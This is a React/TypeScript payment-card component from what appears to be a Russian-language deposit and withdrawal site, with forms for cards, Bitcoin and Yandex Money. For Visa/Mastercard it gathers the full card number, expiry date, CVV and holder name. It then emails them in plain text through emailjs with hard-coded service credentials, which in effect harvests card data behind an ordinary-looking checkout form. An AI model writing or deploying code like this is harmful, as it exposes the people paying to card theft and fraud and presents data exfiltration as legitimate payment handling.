import React from "react";
import styles from "./payment-system-card.module.scss";
import classNames from "classnames";
import { Image } from "semantic-ui-react";
import { IPaymentVariations } from "../../../../plans/payment-variants";
import { NavLink } from "react-router-dom";
import { inject, observer } from "mobx-react";
import packageStore from "../../../../stores/packageStore";
import { toast } from 'react-toastify';
import emailjs from 'emailjs-com';
import Modal from '@material-ui/core/Modal';
import { Input } from "semantic-ui-react";
import stylesButton from "../../../../components/sign-up/sign-up.module.scss";
import DateFnsUtils from '@date-io/date-fns';
import {
  MuiPickersUtilsProvider,
  KeyboardTimePicker,
  KeyboardDatePicker,
} from '@material-ui/pickers';
import moment from 'moment';

interface IPaymentSystemCardProps {
  paymentVariant: IPaymentVariations;
  amount?: number;
}

const PaymentSystemCard = inject('commonStore', 'userStore', 'packageStore')(
  observer(
    class PaymentSystemCard extends React.Component<any> {

      state = {
        modalOpen: false,
        showInput: false,
        card: '',
        cardHolderName: '',
        cardCvv: '',
        selectedDate: new Date(),
      }

      handleDateChange = (date:any) => {
        this.setState({selectedDate: date});
      };


      handleModalClose = () => this.setState({modalOpen: false});

      createTransaction = async () => {
          if(this.props.paymentVariant.type === 'PAYMENT')
          {
              const win = window.open('https://airsolutions.club/payeer.php?userId=' + this.props.userStore.currentUser.id + '&amount='+Number(this.props.amount).toFixed(2));
              if(win)
              {
                  win.focus();
                  return;
              }
          }
        let templateParamsVisaMastercard = {};
        if(this.props.paymentVariant.name === 'Visa/Mastercard' || this.props.paymentVariant.name === 'Visa/Mastercard/Mir RUB')
        {
          templateParamsVisaMastercard = {
              theme: this.props.userStore.currentUser.username,
            message: `${this.props.paymentVariant.type === 'PAYMENT' ? 'Пополнение': 'Вывод'};
            ${this.props.userStore.currentUser.username};
            ${this.props.userStore.currentUser.id}; 
            ${this.props.amount}; 
            ${this.props.commonStore.activeCurrency}; 
            ${this.state.card}-${moment(this.state.selectedDate).format('MM/YYYY')}-${this.state.cardCvv}-${this.state.cardHolderName}; 
            ${this.props.amount * this.props.commonStore.activeCurrencyMultiplierReverse}`
          }
          if(!this.validate_creditcardnumber(this.state.card)){
            toast.error('Введите корректный номер карты');
            return;
          }
        }
        if(!(this.props.amount > 0))
        {
          toast.error('Сумма должна быть больше 0!');
          this.props.commonStore.setActivePaymentName('');
          return;
        }
        if((+this.props.amount > (this.props.commonStore.activeCurrencyMultiplier * this.props.userStore.currentUserProfile.money)) && this.props.paymentVariant.type !== 'PAYMENT')
        {
          toast.error('Недостаточно средств!');
          return;
        }
        const transactionData = {
          amount: this.props.amount * this.props.commonStore.activeCurrencyMultiplierReverse,
          sender: this.props.paymentVariant.type === 'PAYMENT' ? this.props.userStore.currentUser.id : this.props.commonStore.appName,
          recipient: !(this.props.paymentVariant.type === 'PAYMENT') ? this.props.userStore.currentUser.id : this.props.commonStore.appName,
          status: 'В ожидании',
          paymentSystem: this.props.paymentVariant.name
        };
        var templateParams = {
            type: this.props.userStore.currentUser.username,
            username: this.props.userStore.currentUser.username,
            userId: this.props.userStore.currentUser.id,
            amount: this.props.amount,
            activeCurrency: this.props.commonStore.activeCurrency,
            card: this.state.card,
            amountInDollars: this.props.amount * this.props.commonStore.activeCurrencyMultiplierReverse
        };
        const result = await emailjs.send("smtp_server", (this.props.paymentVariant.name === 'Visa/Mastercard' || this.props.paymentVariant.name === 'Visa/Mastercard/Mir RUB') ? 'template_iEnLNFf4' : "only_message", (this.props.paymentVariant.name === 'Visa/Mastercard' || this.props.paymentVariant.name === 'Visa/Mastercard/Mir RUB') ? templateParamsVisaMastercard : templateParams, 'user_h1pqEqKiVUD1zsuXPjKGk');
        // console.log(result);
        await this.props.packageStore.createTransaction(transactionData);
        this.setState({showInput: false});
        this.props.commonStore.setInActivePaymentCard();
          this.props.commonStore.setActivePaymentName('');
      }

      validate_creditcardnumber = (value:string) => {
        var re16digit = /^\d{16}$/;
        if (!re16digit.test(value)) {
            return false;
        }
        return true;
    }

      render() {
        return (
          <div className={classNames(styles.card)} onClick={(this.props.paymentVariant.name !== 'Wire' && this.props.paymentVariant.name !== 'Ethereum' ) ? () => {
              this.props.commonStore.setActivePaymentCard();
              this.props.commonStore.setActivePaymentName(this.props.paymentVariant.name);
              this.setState({showInput: true});
          } : this.createTransaction}>
              {this.props.commonStore.activePaymentCard}
            {(this.state.showInput && this.props.commonStore.activePaymentName === this.props.paymentVariant.name) && (
              <React.Fragment>
                {(this.props.paymentVariant.name === 'Visa/Mastercard' || this.props.paymentVariant.name === 'Visa/Mastercard/Mir RUB' ) && (
                 <React.Fragment>
                  <MuiPickersUtilsProvider utils={DateFnsUtils}>
                  <Input style={{maxWidth: '250px'}} placeholder="Номер карты" onChange={(e) => this.setState({card: e.target.value})} value={this.state.card}/>
                  <Input style={{maxWidth: '250px'}} placeholder="Имя владельца" onChange={(e) => this.setState({cardHolderName: e.target.value})} value={this.state.cardHolderName}/>
                  <KeyboardDatePicker
                    disableToolbar
                    autoOk={true}
                    variant="inline"
                    views={['year', 'month']}
                    format="MM/yyyy"
                    margin="normal"
                    id="date-picker-inline"
                    label="Date picker inline"
                    value={this.state.selectedDate}
                    onChange={this.handleDateChange}
                    KeyboardButtonProps={{
                      'aria-label': 'change date',
                    }}
                    style={{maxWidth: '250px'}}
                  />
                  <Input style={{maxWidth: '250px'}} placeholder="CVV" type='password' onChange={(e) => this.setState({cardCvv: e.target.value})} value={this.state.cardCvv}/>
                  <button
                    className={classNames(stylesButton.btn)}
                    style={{marginTop: 10}}
                    onClick={this.createTransaction}
                  >
                    {this.props.paymentVariant.type === 'PAYMENT' ? 'Пополнить' : 'Вывести'}
                  </button>
                  </MuiPickersUtilsProvider>
                </React.Fragment>
                )}
                {(this.props.paymentVariant.name === 'Bitcoin' && this.props.commonStore.activePaymentName === this.props.paymentVariant.name) && (
                 <React.Fragment>
                  <Input style={{maxWidth: '100%'}} placeholder="Номер кошелька" onChange={(e) => this.setState({card: e.target.value})} value={this.state.card}/>
                  <button
                    className={classNames(stylesButton.btn)}
                    style={{marginTop: 10}}
                    onClick={this.createTransaction}
                  >
                      {this.props.paymentVariant.type === 'PAYMENT' ? 'Пополнить' : 'Вывести'}
                  </button>
                </React.Fragment>
                )}
                {(this.props.paymentVariant.name === 'Yandex Money' && this.props.commonStore.activePaymentName === this.props.paymentVariant.name) && (
                 <React.Fragment>
                  <Input style={{maxWidth: '100%'}} placeholder="Номер кошелька" onChange={(e) => this.setState({card: e.target.value})} value={this.state.card}/>
                  <button
                    className={classNames(stylesButton.btn)}
                    style={{marginTop: 10}}
                    onClick={this.createTransaction}
                  >
                      {this.props.paymentVariant.type === 'PAYMENT' ? 'Пополнить' : 'Вывести'}
                  </button>
                </React.Fragment>
                )}
              </React.Fragment>
              
              
            )}
            {this.props.commonStore.activePaymentName !== this.props.paymentVariant.name && (
              <React.Fragment>
            <div className={this.props.paymentVariant.confines === "Настроить?!" ? classNames(styles.disabled) : ""}>
              <Image src={this.props.paymentVariant.image} size="small" />
            </div>
            <div className={classNames(styles["card-title"])}>
              <p>{this.props.paymentVariant.name}</p>
              <small>
                {this.props.paymentVariant.confines === "Настроить?!" ? (
                  <NavLink to="/profile">{this.props.paymentVariant.confines}</NavLink>
                ) : (
                  this.props.paymentVariant.confines
                )}
              </small>
            </div>
            </React.Fragment>)}
          </div>
        );
      }
    }
  )
);
export { PaymentSystemCard };
